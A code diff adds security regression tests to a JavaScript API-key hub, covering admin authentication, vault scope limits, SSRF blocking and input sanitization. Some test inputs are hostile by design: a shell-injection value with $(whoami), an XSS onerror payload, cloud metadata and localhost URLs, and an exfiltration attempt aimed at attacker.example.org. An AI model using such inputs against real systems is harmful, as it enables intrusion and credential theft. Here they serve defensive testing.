@@ -11,8 +11,9 @@ import { handleVaultManifestRequest } from '../api/vault/manifest.js';
 import { handleVaultFetchRequest } from '../api/vault/fetch.js';
 import { handleVerifyKey } from '../api/admin/verify-key.js';
 import { handleProbeModels } from '../api/admin/probe-models.js';
-import { CONFIG_KV_KEY, loadConfig, resolveKvBinding, resolveEnv } from '../lib/config.js';
+import { CONFIG_KV_KEY, loadConfig, resolveKvBinding, resolveEnv, checkAdminAuth } from '../lib/config.js';
 import { generateNodeToken, hashToken, constantTimeCompare, computeEtag } from '../lib/crypto.js';
+import { PRESET_MAP } from '../lib/generated-presets.js';
 import * as edgeIndex from '../../edge-functions/index.js';
 import * as edgeHealth from '../../edge-functions/health.js';
 import * as edgeHealthz from '../../edge-functions/healthz.js';
@@ -1080,7 +1081,8 @@ describe('EdgeOne Makers Lightweight Hub Test Suite', () => {
       assert.deepEqual(pullData.payload.settings.proxy_keys, ['sk-lite-extra-01']);
       const ds = pullData.payload.providers.deepseek;
       assert.equal(ds.rpm_per_key, 60);
-      assert.equal(ds.refresh_every, '6h');
+      assert.equal(ds.refresh_every, undefined);
+      assert.equal(ds.auto_include, undefined);
       assert.equal(ds.api_keys[0].weight, 3);
       assert.equal(ds.api_keys[0].max_rpm, 30);
       assert.deepEqual(ds.adapter_rules, { auth_header: 'X-Custom-Auth', auth_prefix: 'Token ' });
@@ -1217,5 +1219,316 @@ describe('10. Empty-template guard (nodes must never be starved)', () => {
       kv
     );
     assert.equal(noKeys.status, 400);
+  });
+});
+
+describe('11. Security Hardening & Flat Preset AdapterRules Gates', () => {
+  test('SEC-02: checkAdminAuth fails closed with 503 when ADMIN_PASSWORD is missing and never defaults to "admin"', async () => {
+    const savedEnvPwd = process.env.ADMIN_PASSWORD;
+    delete process.env.ADMIN_PASSWORD;
+    try {
+      const reqDefault = new Request('https://hub.example.com/api/config', {
+        headers: { authorization: 'Bearer admin' },
+      });
+      const resMissing = checkAdminAuth(reqDefault, {});
+      assert.ok(resMissing, 'Missing ADMIN_PASSWORD must reject request');
+      assert.equal(resMissing.status, 503);
+      const bodyMissing = await resMissing.json();
+      assert.equal(bodyMissing.ok, false);
+      assert.match(bodyMissing.error, /ADMIN_PASSWORD is not configured/);
+
+      const resBlank = checkAdminAuth(reqDefault, { ADMIN_PASSWORD: '   ' });
+      assert.ok(resBlank);
+      assert.equal(resBlank.status, 503);
+
+      // Configured ADMIN_PASSWORD works via hashed constant-time compare
+      const validReq = new Request('https://hub.example.com/api/config', {
+        headers: { 'x-admin-key': 'super_secret_hub_pwd' },
+      });
+      assert.equal(checkAdminAuth(validReq, { ADMIN_PASSWORD: 'super_secret_hub_pwd' }), null);
+      assert.equal(checkAdminAuth(reqDefault, { ADMIN_PASSWORD: 'super_secret_hub_pwd' }).status, 401);
+    } finally {
+      if (savedEnvPwd !== undefined) process.env.ADMIN_PASSWORD = savedEnvPwd;
+    }
+  });
+
+  test('SEC-01: Vault enforces Full-only role (403 on Lite) and provider scope isolation on manifest & fetch', async () => {
+    const kv = new MockKV();
+    await handleConfigRequest(
+      makeAdminReq('POST', '/api/config', {
+        _version: 1,
+        providers: {
+          openrouter: {
+            name: 'OpenRouter',
+            enabled: true,
+            api_keys: [{ id: 'k1', label: 'or-1', key: 'sk-or-allowed', enabled: true }],
+          },
+          deepseek: {
+            name: 'DeepSeek',
+            enabled: true,
+            api_keys: [{ id: 'k2', label: 'ds-1', key: 'sk-ds-forbidden', enabled: true }],
+          },
+          local_is_local: {
+            name: 'LocalFlagged',
+            is_local: true,
+            enabled: true,
+            api_keys: [{ id: 'k3', label: 'loc-1', key: 'sk-local-flag', enabled: true }],
+          },
+        },
+      }),
+      TEST_ENV,
+      kv
+    );
+
+    // 1. Issue a scoped Full node allowed ONLY 'openrouter'
+    const fullScoped = await (
+      await handleNodesRequest(
+        makeAdminReq('POST', '/api/admin/nodes', {
+          name: 'scoped-full',
+          role: 'full',
+          scope: { providers: ['openrouter'], models: ['*'] },
+        }),
+        TEST_ENV,
+        kv
+      )
+    ).json();
+
+    // Manifest for scoped Full node only lists 'openrouter', never 'deepseek' or 'local_is_local'
+    const mfResp = await handleVaultManifestRequest(
+      new Request('https://hub.example.com/api/vault/manifest', {
+        headers: { authorization: `Bearer ${fullScoped.node_token}` },
+      }),
+      TEST_ENV,
+      kv
+    );
+    assert.equal(mfResp.status, 200);
+    const mfData = await mfResp.json();
+    assert.deepEqual(Object.keys(mfData.providers), ['openrouter']);
+
+    // Fetch in-scope provider -> 200
+    const okFetch = await handleVaultFetchRequest(
+      makeNodeReq('POST', '/api/vault/fetch', fullScoped.node_token, null, { provider: 'openrouter' }),
+      TEST_ENV,
+      kv
+    );
+    assert.equal(okFetch.status, 200);
+
+    // Fetch out-of-scope provider -> 403 provider_out_of_node_scope
+    const forbiddenFetch = await handleVaultFetchRequest(
+      makeNodeReq('POST', '/api/vault/fetch', fullScoped.node_token, null, { provider: 'deepseek' }),
+      TEST_ENV,
+      kv
+    );
+    assert.equal(forbiddenFetch.status, 403);
+    const fbBody = await forbiddenFetch.json();
+    assert.equal(fbBody.error, 'provider_out_of_node_scope');
+
+    // Admin fetch on is_local provider -> 404
+    const localFlagResp = await handleVaultFetchRequest(
+      makeAdminReq('POST', '/api/vault/fetch', { provider: 'local_is_local' }),
+      TEST_ENV,
+      kv
+    );
+    assert.equal(localFlagResp.status, 404);
+
+    // 2. Issue a Lite node -> rejected with 403 on both /api/vault/manifest and /api/vault/fetch
+    const liteIssued = await (
+      await handleNodesRequest(
+        makeAdminReq('POST', '/api/admin/nodes', {
+          name: 'lite-only',
+          role: 'lite',
+          scope: { providers: ['*'], models: ['*'] },
+        }),
+        TEST_ENV,
+        kv
+      )
+    ).json();
+
+    const liteMf = await handleVaultManifestRequest(
+      new Request('https://hub.example.com/api/vault/manifest', {
+        headers: { authorization: `Bearer ${liteIssued.node_token}` },
+      }),
+      TEST_ENV,
+      kv
+    );
+    assert.equal(liteMf.status, 403);
+
+    const liteFt = await handleVaultFetchRequest(
+      makeNodeReq('POST', '/api/vault/fetch', liteIssued.node_token, null, { provider: 'openrouter' }),
+      TEST_ENV,
+      kv
+    );
+    assert.equal(liteFt.status, 403);
+  });
+
+  test('SEC-11: isSafePublicHttpUrl blocks SSRF targets and stored KV keys ignore caller-supplied base_url', async () => {
+    const unsafeUrls = [
+      'http://127.0.0.1:8080/v1',
+      'http://169.254.169.254/latest/meta-data',
+      'http://localhost:11434/v1',
+    ];
+
+    let fetchCalled = false;
+    const guardFetch = async () => {
+      fetchCalled = true;
+      return new Response('{}', { status: 200 });
+    };
+
+    for (const badUrl of unsafeUrls) {
+      const vResp = await handleVerifyKey(
+        makeAdminReq('POST', '/api/admin/verify-key', {
+          provider: 'custom',
+          base_url: badUrl,
+          api_key: 'sk-test-12345678',
+        }),
+        TEST_ENV,
+        guardFetch
+      );
+      assert.equal(vResp.status, 400);
+      const vJson = await vResp.json();
+      assert.equal(vJson.ok, false);
+      assert.equal(vJson.valid, false);
+      assert.equal(vJson.error, 'unsafe_upstream_url');
+
+      const pResp = await handleProbeModels(
+        makeAdminReq('POST', '/api/admin/probe-models', {
+          provider: 'custom',
+          base_url: badUrl,
+          api_key: 'sk-test-12345678',
+        }),
+        TEST_ENV,
+        guardFetch
+      );
+      assert.equal(pResp.status, 400);
+      const pJson = await pResp.json();
+      assert.equal(pJson.ok, false);
+      assert.equal(pJson.error, 'unsafe_upstream_url');
+    }
+    assert.equal(fetchCalled, false, 'Outbound fetch must never fire on unsafe URLs');
+
+    // Stored KV key exfiltration guard: caller sends masked key + attacker base_url
+    const kv = new MockKV();
+    await kv.put(
+      CONFIG_KV_KEY,
+      JSON.stringify({
+        _version: 1,
+        providers: {
+          openai: {
+            name: 'OpenAI',
+            enabled: true,
+            base_url: 'https://api.openai.com/v1',
+            api_keys: [{ id: 'k1', label: 'main', key: 'sk-stored-kv-real-secret-777', enabled: true }],
+          },
+        },
+      })
+    );
+    const envWithKv = { ...TEST_ENV, agent_kv: kv };
+    const seenUrls = [];
+    const mockFetch = async (url) => {
+      seenUrls.push(url);
+      return new Response(JSON.stringify({ data: [{ id: 'gpt-4o' }] }), {
+        status: 200,
+        headers: { 'content-type': 'application/json' },
+      });
+    };
+
+    const exfilVerify = await handleVerifyKey(
+      makeAdminReq('POST', '/api/admin/verify-key', {
+        provider: 'openai',
+        key_label: 'main',
+        api_key: 'sk-●●●●●●777',
+        base_url: 'https://attacker.example.org/v1',
+      }),
+      envWithKv,
+      mockFetch
+    );
+    assert.equal(exfilVerify.status, 200);
+    assert.equal(seenUrls[0], 'https://api.openai.com/v1/models');
+
+    const exfilProbe = await handleProbeModels(
+      makeAdminReq('POST', '/api/admin/probe-models', {
+        provider: 'openai',
+        key_label: 'main',
+        api_key: 'sk-●●●●●●777',
+        base_url: 'https://attacker.example.org/v1',
+      }),
+      envWithKv,
+      mockFetch
+    );
+    assert.equal(exfilProbe.status, 200);
+    assert.equal(seenUrls[1], 'https://api.openai.com/v1/models');
+  });
+
+  test('F-02 & SEC-16: generated-presets.js emits flat v2 AdapterRules and node shell/usage inputs are sanitized', async () => {
+    const vertexRules = PRESET_MAP.vertex?.adapter_rules;
+    assert.ok(vertexRules, 'vertex preset must have adapter_rules');
+    assert.equal(vertexRules.gemini_compat, true);
+    assert.equal(vertexRules.thought_tag_marker, '<thought>');
+    assert.equal(vertexRules.ensure_google_prefix, true);
+    assert.equal(vertexRules.rescue_from_text, true);
+    assert.equal(vertexRules.reasoning, undefined, 'nested v1 reasoning object must be flattened');
+    assert.equal(vertexRules.tools, undefined, 'nested v1 tools object must be flattened');
+
+    const minimaxRules = PRESET_MAP.minimax?.adapter_rules;
+    assert.equal(minimaxRules.thinking_policy, 'force');
+    assert.deepEqual(minimaxRules.strip_params, ['output_config']);
+    assert.equal(minimaxRules.model_aliases['minimax-m3'], 'MiniMax-M3');
+
+    const clineRules = PRESET_MAP.cline?.adapter_rules;
+    assert.equal(clineRules.unwrap_root, 'data');
+
+    const amdRules = PRESET_MAP.amd?.adapter_rules;
+    assert.equal(amdRules.deny_developer_role, true);
+    assert.equal(amdRules.system_first_only, true);
+    assert.deepEqual(amdRules.reasoning_fields, ['reasoning']);
+
+    const openrouterRules = PRESET_MAP.openrouter?.adapter_rules;
+    assert.equal(openrouterRules.extra_headers['X-Title'], 'OCRProxy');
+
+    // SEC-16 & F-09: client_key shell sanitization + usage model key sanitization
+    const kv = new MockKV();
+    await handleConfigRequest(
+      makeAdminReq('POST', '/api/config', {
+        _version: 1,
+        providers: {
+          openai: {
+            name: 'OpenAI',
+            enabled: true,
+            base_url: 'https://api.openai.com/v1',
+            api_keys: [{ id: 'k1', label: 'k1', key: 'sk-12345678', enabled: true }],
+          },
+        },
+        settings: {
+          client_key: 'sk-good"$(whoami)`id` key',
+        },
+      }),
+      TEST_ENV,
+      kv
+    );
+
+    const issued = await (
+      await handleNodesRequest(makeAdminReq('POST', '/api/admin/nodes', { name: 'sec16', role: 'lite' }), TEST_ENV, kv)
+    ).json();
+    assert.equal(issued.bootstrap_env.includes('$('), false);
+    assert.equal(issued.bootstrap_env.includes('`'), false);
+    assert.equal(issued.bootstrap_env.includes('"'), false);
+
+    const syncReq = new Request('https://hub.example.com/api/node/config', {
+      method: 'POST',
+      headers: {
+        authorization: `Bearer ${issued.node_token}`,
+        'x-node-usage': JSON.stringify({
+          requests: 5,
+          successes: 5,
+          models: { '<img src=x onerror=alert(1)>gpt-4o': 5 },
+        }),
+      },
+    });
+    await handleNodeConfigRequest(syncReq, TEST_ENV, kv);
+    const nodesData = await (await handleNodesRequest(makeAdminReq('GET', '/api/admin/nodes'), TEST_ENV, kv)).json();
+    const updatedNode = nodesData.nodes.find((n) => n.id === issued.node.id);
+    const storedModelNames = Object.keys(updatedNode.usage.models);
+    assert.equal(storedModelNames.length, 1);
+    assert.equal(/[<>"'&]/.test(storedModelNames[0]), false);
   });
 });
